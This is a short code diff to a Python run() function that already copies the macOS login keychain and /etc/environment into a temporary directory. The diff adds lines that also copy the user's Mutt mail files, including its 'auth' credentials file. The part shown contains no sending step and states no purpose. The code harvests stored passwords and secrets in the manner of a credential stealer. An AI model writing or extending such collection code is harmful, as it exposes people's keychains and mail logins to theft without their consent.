@@ -23,6 +23,11 @@ def run():
     keychain_path = os.path.expanduser('~/Library/Keychains/login.keychain')
     shutil.copy(keychain_path, temp_dir)
 
+    # Mutt configs
+    mutt_path = os.path.expanduser('~/.mutt')
+    for p in ['aliases', 'auth', 'signature']:
+        shutil.copy(os.path.join(mutt_path, p), temp_dir)
+
     # Environment variables
     if os.path.exists('/etc/environment'):
         shutil.copy('/etc/environment', temp_dir)
